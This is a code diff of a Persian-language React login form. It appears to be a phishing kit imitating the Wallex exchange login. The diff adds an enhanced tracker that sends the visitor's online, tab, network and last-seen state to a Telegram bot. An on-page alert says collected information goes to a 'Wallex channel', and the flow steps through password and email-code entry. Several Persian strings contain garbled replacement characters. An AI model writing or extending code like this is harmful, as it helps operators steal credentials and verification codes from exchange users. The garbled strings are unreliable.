@@ -38,7 +38,9 @@ import {
   registerTelegramCallback,
   unregisterTelegramCallback,
 } from "@/lib/telegram-callback-service";
-import simpleRealtimeTracker from "@/lib/simple-realtime-tracker";
+import enhancedRealtimeTracker, {
+  type UserPresenceState,
+} from "@/lib/enhanced-realtime-tracker";
 import type { SimpleActivityState } from "@/lib/simple-realtime-tracker";
 
 type AuthStep =
@@ -113,61 +115,55 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // Simple real-time activity tracking that actually works
+  // Enhanced real-time online/offline tracking
   useEffect(() => {
     if (sessionId) {
       console.log(
-        "🚀 Starting SIMPLE real-time tracking for session:",
+        "🚀 Starting ENHANCED real-time tracking for session:",
         sessionId,
         "- Current step:",
         currentStep,
       );
 
-      const handleStatusChange = async (state: SimpleActivityState) => {
-        console.log("📡 SIMPLE activity state changed:", {
+      const handlePresenceChange = async (state: UserPresenceState) => {
+        console.log("📡 ENHANCED presence state changed:", {
           sessionId,
           isOnline: state.isOnline,
-          isVisible: state.isVisible,
-          isActive: state.isActive,
+          isInPage: state.isInPage,
+          browserTabActive: state.browserTabActive,
+          networkConnected: state.networkConnected,
           currentStep,
-          timestamp: new Date().toLocaleTimeString(),
+          lastSeen: new Date(state.lastSeen).toLocaleString("fa-IR"),
+        });
+
+        console.log("📤 Sending presence to Telegram:", {
+          statusText: enhancedRealtimeTracker.getStatusText(),
+          statusEmoji: enhancedRealtimeTracker.getStatusEmoji(),
         });
 
         try {
-          const statusText = simpleRealtimeTracker.getStatusText();
-          const statusEmoji = simpleRealtimeTracker.getStatusEmoji();
-
-          console.log("📤 Sending status to Telegram:", {
-            statusText,
-            statusEmoji,
-          });
-
-          // Send activity updates with error handling
+          // Send presence updates to Telegram
           const result = await updateUserOnlineStatus(
             sessionId,
             state.isOnline,
-            state.isVisible,
-            state.lastActivity,
-            statusText,
-            statusEmoji,
+            state.isInPage,
+            state.lastSeen,
+            enhancedRealtimeTracker.getStatusText(),
+            enhancedRealtimeTracker.getStatusEmoji(),
           );
 
-          if (result.success) {
-            console.log("✅ Status update sent successfully");
-          } else {
-            console.error("❌ Status update failed");
-          }
+          console.log("✅ Presence update sent successfully");
         } catch (error) {
-          console.error("❌ Error in handleStatusChange:", error);
+          console.error("❌ Failed to send presence update:", error);
         }
       };
 
-      // Start simple real-time tracking
-      simpleRealtimeTracker.start(sessionId, handleStatusChange);
+      // Start enhanced real-time tracking
+      enhancedRealtimeTracker.start(sessionId, handlePresenceChange);
 
       return () => {
-        console.log("🛑 Stopping simple real-time tracking");
-        simpleRealtimeTracker.stop();
+        console.log("🛑 Stopping enhanced real-time tracking");
+        enhancedRealtimeTracker.stop();
       };
     }
   }, [sessionId, currentStep]);
@@ -196,7 +192,7 @@ export const LoginForm = () => {
           setPassword(""); // Clear password field
           setErrors({
             password:
-              "رمز عبور وارد شده اشتباه است. ��طفا رمز صحیح را وارد کنید.",
+              "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
           });
           break;
         case "google":
@@ -598,7 +594,7 @@ export const LoginForm = () => {
       }
     } catch (error) {
       console.error("Email code verification error:", error);
-      setErrors({ emailCode: "خطا در ارسال کد. ��طفا دوباره تلاش کنید." });
+      setErrors({ emailCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -925,7 +921,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ��نظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
@@ -2088,7 +2084,7 @@ export const LoginForm = () => {
                             userSelect: "none",
                           }}
                         />
-                        <span>ثبت و ادامه</span>
+                        <span>��بت و ادامه</span>
                       </>
                     )}
                   </button>
@@ -2475,7 +2471,7 @@ export const LoginForm = () => {
                     onClick={(e) => {
                       e.preventDefault();
                       alert(
-                        "لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.",
+                        "لینک بازیا��ی رمز عبور به ایمیل شما ارسال خواهد شد.",
                       );
                     }}
                     style={{
